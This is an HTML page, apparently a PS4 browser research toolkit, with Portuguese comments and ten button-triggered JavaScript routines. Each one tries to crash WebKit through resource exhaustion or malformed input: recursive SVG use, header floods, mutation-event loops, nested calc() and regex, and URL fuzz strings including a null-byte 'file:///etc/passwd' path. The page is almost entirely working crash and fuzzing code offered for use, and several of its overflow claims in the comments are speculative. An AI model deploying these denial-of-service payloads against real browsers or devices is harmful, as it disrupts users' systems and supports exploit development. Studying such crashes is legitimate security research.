<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Deep Analysis Suite v14000</title>
</head>
<body>

<h1>SUITE V14000: RESOURCE EXHAUSTION & STACK SMASH</h1>
<p>Status: Ready. Target: Kernel Stack & Memory Limits.</p>
<hr>

<button onclick="crashSVGUseRecursion()">01. SVG &lt;use&gt; Element Infinite Recursion (Layout Crash)</button>

<button onclick="crashCanvasLineDash()">02. Canvas setLineDash Huge Array Buffer Overflow (Driver Panic)</button>

<button onclick="crashXHRHeaderFlood()">03. XMLHttpRequest setRequestHeader Flood (NetStack Panic)</button>

<button onclick="crashDOMSubtreeLoop()">04. DOMSubtreeModified Event Infinite Loop (Stack Exhaustion)</button>

<button onclick="crashArraySpreadBomb()">05. Array Spread Syntax (...) Memory Bomb (OOM)</button>

<button onclick="crashCSSCalcDepth()">06. CSS calc() Deep Nesting Stack Overflow</button>

<button onclick="crashChannelSplitterCount()">07. ChannelSplitterNode Max Channel Overflow (DSP Crash)</button>

<button onclick="crashURLProtocolFuzz()">08. URL Protocol Handler Buffer Overflow</button>

<button onclick="crashTextNodeSplit()">09. TextNode.splitText() Offset Boundary Race</button>

<button onclick="crashRegExpCompile()">10. RegExp Compilation Buffer Overflow (YARR Engine)</button>

<div id="log"></div>

<script>
    function log(msg) {
        document.getElementById('log').innerText += "\n" + msg;
    }

    // 01. SVG Use Recursion
    // Alvo: WebCore SVG Render Tree
    // Lógica: O elemento <use> clona elementos. Se <use> apontar para si mesmo
    // ou criar uma cadeia circular (A->B->A), o motor de renderização entra em loop infinito.
    function crashSVGUseRecursion() {
        const svgNS = "http://www.w3.org/2000/svg";
        const svg = document.createElementNS(svgNS, "svg");
        
        const defs = document.createElementNS(svgNS, "defs");
        const g = document.createElementNS(svgNS, "g");
        g.id = "crash-cycle";
        
        const use = document.createElementNS(svgNS, "use");
        // Aponta para o pai (g), que contém o próprio use. Ciclo mortal.
        use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#crash-cycle");
        
        g.appendChild(use);
        defs.appendChild(g);
        svg.appendChild(defs);
        
        // Renderiza o SVG para forçar o cálculo da árvore
        const useRender = document.createElementNS(svgNS, "use");
        useRender.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#crash-cycle");
        svg.appendChild(useRender);
        
        document.body.appendChild(svg);
    }

    // 02. Canvas setLineDash Huge Array
    // Alvo: 2D Graphics Driver (Command Buffer)
    // Lógica: setLineDash aceita um array. Se passarmos um array gigantesco,
    // o driver tenta copiar esses valores para o buffer de comando da GPU.
    function crashCanvasLineDash() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        
        // Cria array massivo (1 milhão de elementos)
        // Isso pode estourar o buffer de comando IPC entre WebKit e GPU
        const hugeDash = new Array(1000000).fill(1);
        
        try {
            ctx.setLineDash(hugeDash);
            ctx.strokeRect(0,0,100,100); // Força processamento
        } catch(e) {}
    }

    // 03. XMLHttpRequest setRequestHeader Flood
    // Alvo: Kernel Network Stack (Mbuf Headers)
    // Lógica: Cada header HTTP consome memória no kernel socket buffer.
    // Adicionar milhares de headers grandes fragmenta a memória de rede.
    function crashXHRHeaderFlood() {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", "/");
        
        const hugeVal = "A".repeat(1024); // 1KB value
        
        try {
            // Tenta injetar 50MB de headers
            for(let i=0; i<50000; i++) {
                xhr.setRequestHeader("X-Crash-" + i, hugeVal);
            }
            xhr.send();
        } catch(e) {}
    }

    // 04. DOMSubtreeModified Event Infinite Loop
    // Alvo: WebCore DOM Event Dispatcher
    // Lógica: Evento de mutação síncrono. Se o handler modificar o DOM, o evento dispara novamente.
    // Isso consome a stack C++ até o limite do processo.
    function crashDOMSubtreeLoop() {
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        let i = 0;
        div.addEventListener('DOMSubtreeModified', () => {
            // Modifica o DOM dentro do evento de modificação
            if(i++ < 100000) {
                div.setAttribute('data-flood', i);
            }
        });
        
        // Trigger inicial
        div.setAttribute('data-start', '1');
    }

    // 05. Array Spread Syntax Memory Bomb
    // Alvo: JSC Heap Allocator
    // Lógica: Spread (...) na stack tenta alocar todos os argumentos de uma vez.
    // PS4 tem limite de stack. Tentar espalhar um array gigante numa função causa OOM/Crash.
    function crashArraySpreadBomb() {
        // Array com 500k elementos
        const a = new Array(500000).fill(1);
        try {
            // Tenta passar 500k argumentos via stack
            Math.max(...a);
        } catch(e) {
            // Se falhar o stack, tenta heap bomb
            const b = [...a, ...a, ...a, ...a]; // 2 milhões
        }
    }

    // 06. CSS calc() Deep Nesting Stack Overflow
    // Alvo: CSS Parser
    // Lógica: Recursividade profunda em calc()
    function crashCSSCalcDepth() {
        const div = document.createElement('div');
        let style = "10px";
        // Aninhamento profundo
        for(let i=0; i<5000; i++) {
            style = `calc(1px + ${style})`;
        }
        try {
            div.style.height = style;
            // Acesso força o parser a resolver a expressão
            const h = div.style.height;
        } catch(e) {}
    }

    // 07. ChannelSplitterNode Max Channel Overflow
    // Alvo: Audio DSP Kernel
    // Lógica: ChannelSplitter/Merger tem um limite de canais (geralmente 32).
    // Tentar forçar um número absurdo pode causar buffer overflow no alocador DSP.
    function crashChannelSplitterCount() {
        if(!window.AudioContext) return;
        const ctx = new AudioContext();
        try {
            // Tenta criar node com canais acima do suportado
            // Se o check for fraco, aloca buffer inválido
            const split = ctx.createChannelSplitter(0xFFFFFFFF); // Max int
            split.connect(ctx.destination);
        } catch(e) {
            // Fallback: Tenta criar muitos nodes válidos para exaurir recursos de áudio
            for(let i=0; i<1000; i++) {
                try { ctx.createChannelSplitter(32); } catch(ex){}
            }
        }
    }

    // 08. URL Protocol Fuzzing
    // Alvo: WebKit URL Parser
    // Lógica: Passar caracteres de controle e null bytes no protocolo da URL.
    function crashURLProtocolFuzz() {
        const payloads = [
            "http://%00%00.com",
            "file:///etc/passwd%00.png",
            "A".repeat(5000) + "://crash",
            "javascript:void(" + "A".repeat(5000) + ")"
        ];
        
        for(let p of payloads) {
            try {
                // Tenta parsear e navegar (histórico)
                window.history.pushState({}, "", p);
                new URL(p);
            } catch(e) {}
        }
    }

    // 09. TextNode.splitText() Offset Boundary Race
    // Alvo: WebCore DOM TextNode
    // Lógica: splitText divide um nó de texto. Se alterarmos o texto
    // (via innerHTML do pai) exatamente quando splitText calcula o offset...
    function crashTextNodeSplit() {
        const div = document.createElement('div');
        const text = document.createTextNode("A".repeat(10000));
        div.appendChild(text);
        document.body.appendChild(div);
        
        // Race condition simulada
        // Precisaria de workers para ser perfeito, mas a lógica sequencial
        // pode falhar se o texto for muito grande (realloc)
        try {
            // Tenta dividir num offset que pode não existir mais após uma mutação
            // Simulamos mutação síncrona via event handler se possível, 
            // ou apenas boundary check stress
            text.splitText(9999);
            text.splitText(0);
            text.splitText(text.length); // Boundary
        } catch(e) {}
    }

    // 10. RegExp Compilation Buffer Overflow
    // Alvo: YARR (Regex Engine)
    // Lógica: Criar uma regex com grupos de captura aninhados absurdamente.
    // Isso estoura o buffer de bytecode da regex.
    function crashRegExpCompile() {
        let pattern = "a";
        // Aninha grupos: (((((...)))))
        for(let i=0; i<5000; i++) {
            pattern = "(" + pattern + ")";
        }
        
        try {
            const re = new RegExp(pattern);
            re.test("a");
        } catch(e) {}
    }
</script>

</body>
</html>
